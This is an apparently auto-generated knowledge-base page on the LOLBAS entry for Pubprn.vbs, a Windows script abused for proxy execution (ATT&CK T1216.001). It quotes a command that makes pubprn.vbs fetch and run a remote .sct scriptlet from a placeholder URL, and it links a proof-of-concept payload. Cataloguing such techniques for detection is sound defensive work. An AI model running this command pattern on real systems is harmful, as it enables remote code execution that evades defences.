---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Pubprn.vbs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `pubprn.vbs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Pubprn.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Proxy execution with Pubprn.vbs

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/pubprn.vbs.md)
- Source verification: [source record](../../sources/lolbas/pubprn.vbs.md)

## Aliases

- `Pubprn.vbs`
- `pubprn.vbs`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1216.001 - PubPrn](../../attack/techniques/T1216.001-pubprn.md) | explicit | source | Command metadata lists T1216.001: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/pubprn.vbs.md)

## Source Verification

[source record](../../sources/lolbas/pubprn.vbs.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@enigma0x3'
Person: Matt Nelson
Author: Oddvar Moe
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct
Commands:
- Category: Execute
```
